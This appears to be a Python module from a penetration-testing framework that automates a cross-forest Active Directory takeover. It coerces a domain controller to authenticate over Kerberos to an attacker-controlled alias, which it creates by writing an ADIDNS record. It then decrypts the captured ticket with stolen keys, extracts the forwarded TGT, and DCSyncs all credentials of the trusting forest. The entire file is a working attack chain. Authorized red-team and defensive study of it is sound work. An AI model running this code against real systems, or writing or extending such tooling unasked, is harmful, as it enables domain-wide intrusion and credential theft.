"""Cross-forest escalation via cross-org TGT delegation (execution).

Consumer of the reusable ``kerberos_coercion_capture`` primitive. After a
TRUSTED forest is compromised and its trust to the TRUSTING forest carries
``TRUST_ATTRIBUTE_CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION`` (modeled + detected
elsewhere), this coerces a DC of the trusting forest to authenticate over
Kerberos to a name/SPN whose key we hold (from the compromised trusted forest),
captures the forwarded TGT of that trusting-forest DC, and DCSyncs the trusting
forest with it — completing the kill chain across the forest boundary.

General (not MSSQL-tied): the coercion is any native method; the decryption key
is any account we control in the compromised trusted forest. The MSSQL-on-DC
case (we hold the trusted DC's own machine key via SYSTEM-on-DC) is one instance.

AES-first (posture doctrine): pass the service account's CLEARTEXT machine
password so ``derive_service_keys`` produces the AES keys — RC4-only (NT hash
without the cleartext) is the fallback, never the preference.

Design: docs/superpowers/specs/2026-08-03-kerberos-coercion-capture-module.md
"""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path

from adscan_core import telemetry
from adscan_core.rich_output import (
    print_error,
    print_exception,
    print_info,
    print_success,
    print_warning,
)
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.services.adidns import ADIDNSConfig
from adscan_internal.services.krb_ap_req import (
    decrypt_service_ticket,
    derive_service_keys,
    extract_ap_req_from_spnego,
    extract_delegated_tgt,
)
from adscan_internal.services.relay.kerberos_coercion_capture import (
    KrbCaptureRequest,
    coerce_and_capture,
)

# Kerberos etype preference (AES over RC4, per the posture doctrine — ADscan
# always prefers AES even when RC4 is accepted). AES256=18, AES128=17, RC4=23.
_ETYPE_RANK = {18: 0, 17: 1, 23: 2}


def _aes_first(keys: list[tuple[int, bytes]]) -> list[tuple[int, bytes]]:
    """Order candidate (etype, key) pairs AES-first so decryption tries AES first."""
    return sorted(keys, key=lambda ek: _ETYPE_RANK.get(ek[0], 99))


@dataclass
class CrossOrgTgtDelegationResult:
    """Outcome of one cross-org TGT-delegation escalation attempt."""

    success: bool
    forwarded_principal: str | None = None  # e.g. DC01$@DARKZERO.HTB
    dcsync_result: dict | None = None
    error: str | None = None


async def execute_cross_org_tgt_delegation(
    shell,
    *,
    trusting_domain: str,
    coerce_dc_ip: str,
    listener_host: str,
    relay_alias_hostname: str,
    service_domain: str,
    service_hostname: str,
    adidns: ADIDNSConfig,
    workspace_dir: str,
    service_keys: list[tuple[int, bytes]] | None = None,
    service_password: str = "",
    service_nt_hash: str = "",
    capture_timeout: float = 120.0,
) -> CrossOrgTgtDelegationResult:
    """Coerce a trusting-forest DC, capture its forwarded TGT, DCSync the trusting forest.

    Args:
        shell: The active PentestShell.
        trusting_domain: The forest we are escalating INTO (e.g. ``darkzero.htb``).
        coerce_dc_ip: IP of a DC of ``trusting_domain`` to coerce.
        listener_host: Our IP the relay alias points at and the listener binds on.
        relay_alias_hostname: Short alias the DC is coerced to (resolves — via
            ADIDNS in the compromised trusted forest — to us, and maps to the
            service SPN below so the inbound auth is Kerberos).
        service_domain / service_hostname: The account/host whose key decrypts
            the AP-REQ (an account we control in the compromised trusted forest;
            in the MSSQL-on-DC case, the trusted DC's own machine account).
        service_keys: Pre-computed ``(etype, key)`` pairs — PREFERRED (AES-first).
            After DCSyncing the trusted forest we already hold the service
            account's full Kerberos key set including the AES keys, which are NOT
            derivable from the NT hash. Pass them here.
        service_password: Fallback — the service account CLEARTEXT machine
            password, from which AES keys ARE derivable. Used when ``service_keys``
            is not supplied.
        service_nt_hash: Last-resort fallback — RC4 only (no AES).
        adidns: Credentials/target to write the alias A record.
        workspace_dir: Where to write the captured ccache.
        capture_timeout: Seconds to wait for the coerced authentication.

    Best-effort — never raises; returns a typed result.
    """
    if not service_keys and not service_password and not service_nt_hash:
        return CrossOrgTgtDelegationResult(
            success=False, error="no service key material (keys/password/NT hash) available"
        )
    if not service_keys and not service_password:
        print_warning(
            "Cross-org TGT delegation: only the RC4 NT hash is available for the "
            "service key; AES etypes cannot be derived. If the trusting DC "
            "negotiates AES, capture may not decrypt — DCSync the trusted forest "
            "for the AES key set (or recover the cleartext machine password)."
        )

    try:
        capture = await coerce_and_capture(
            KrbCaptureRequest(
                domain=service_domain,
                coerce_target_ip=coerce_dc_ip,
                relay_alias_hostname=relay_alias_hostname,
                listener_host=listener_host,
                adidns=adidns,
                capture_timeout=capture_timeout,
            )
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return CrossOrgTgtDelegationResult(
            success=False, error=f"coercion-capture raised: {type(exc).__name__}: {exc}"
        )

    if capture.spnego_blob is None:
        return CrossOrgTgtDelegationResult(
            success=False, error=capture.error or "no authentication captured"
        )
    if not capture.is_kerberos:
        # Honest data gap — NTLM carries no forwarded TGT. Never a defence claim.
        return CrossOrgTgtDelegationResult(
            success=False,
            error="captured NTLM, not Kerberos — no forwarded TGT (data gap; the "
            "coercion did not go Kerberos against the controlled SPN)",
        )

    # Decode the AP-REQ with the service key (AES-first) and pull out the
    # forwarded TGT of the coerced trusting-forest DC. Prefer the pre-computed
    # keys we already hold (DCSync of the trusted forest gives the AES key set);
    # otherwise derive from the cleartext password.
    try:
        ap_req = extract_ap_req_from_spnego(capture.spnego_blob) or capture.spnego_blob
        if service_keys:
            candidate_keys = _aes_first(service_keys)
        else:
            candidate_keys = _aes_first(
                derive_service_keys(
                    service_password, service_nt_hash, service_domain, service_hostname
                )
            )
        svc_ticket = decrypt_service_ticket(ap_req, candidate_keys)
        dtgt = extract_delegated_tgt(ap_req, svc_ticket) if svc_ticket else None
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return CrossOrgTgtDelegationResult(
            success=False, error=f"AP-REQ decode raised: {type(exc).__name__}: {exc}"
        )
    if svc_ticket is None:
        return CrossOrgTgtDelegationResult(
            success=False,
            error="could not decrypt the captured ticket — wrong service key or "
            "etype (recover the correct machine key material for the SPN's account)",
        )
    if dtgt is None:
        return CrossOrgTgtDelegationResult(
            success=False,
            error="no delegated TGT in the captured AP-REQ (TGT delegation may not "
            "be enabled on the trust, or the client is in Protected Users)",
        )

    forwarded_principal = f"{dtgt.client_name}@{dtgt.client_realm}"
    print_success(
        "Cross-org TGT delegation: captured forwarded TGT "
        f"{mark_sensitive(forwarded_principal, 'user')} — replicating "
        f"{mark_sensitive(trusting_domain, 'domain')}."
    )

    # Persist the forwarded TGT as a ccache and DCSync the trusting forest AS that
    # principal (a trusting-forest DC machine account => replication rights),
    # through the DCSync SSOT (which carries the SAM/LSA/DPAPI fallback + ask).
    ccache_path = str(
        Path(workspace_dir) / f"crossorg_{dtgt.client_name.rstrip('$')}_tgt.ccache"
    )
    try:
        Path(ccache_path).parent.mkdir(parents=True, exist_ok=True)
        Path(ccache_path).write_bytes(dtgt.ccache_bytes)
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return CrossOrgTgtDelegationResult(
            success=False,
            forwarded_principal=forwarded_principal,
            error=f"could not persist captured ccache: {exc}",
        )

    from adscan_internal.cli.secretsdump import execute_dcsync_native

    previous_context = getattr(shell, "_current_dcsync_context", None)
    shell._current_dcsync_context = {
        "domain": trusting_domain,
        "username": dtgt.client_name,
        # execute_dcsync_native reads a ``.ccache`` PATH from the password field.
        "password": ccache_path,
        "target_user": "all",
        "retry_attempted": False,
    }
    try:
        print_info(
            f"DCSync {mark_sensitive(trusting_domain, 'domain')} via the forwarded "
            f"{mark_sensitive(dtgt.client_name, 'user')} TGT."
        )
        dcsync_result = execute_dcsync_native(
            shell,
            domain=trusting_domain,
            auth_domain=dtgt.client_realm,
            target_users=None,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        print_error("DCSync via the forwarded TGT failed.")
        return CrossOrgTgtDelegationResult(
            success=False,
            forwarded_principal=forwarded_principal,
            error=f"DCSync raised: {type(exc).__name__}: {exc}",
        )
    finally:
        shell._current_dcsync_context = previous_context

    if not dcsync_result:
        return CrossOrgTgtDelegationResult(
            success=False,
            forwarded_principal=forwarded_principal,
            error="DCSync returned no credentials via the forwarded TGT",
        )

    print_success(
        f"Cross-forest escalation complete — {mark_sensitive(trusting_domain, 'domain')} "
        "replicated via cross-org TGT delegation."
    )
    return CrossOrgTgtDelegationResult(
        success=True,
        forwarded_principal=forwarded_principal,
        dcsync_result=dcsync_result,
    )


__all__ = ["CrossOrgTgtDelegationResult", "execute_cross_org_tgt_delegation"]
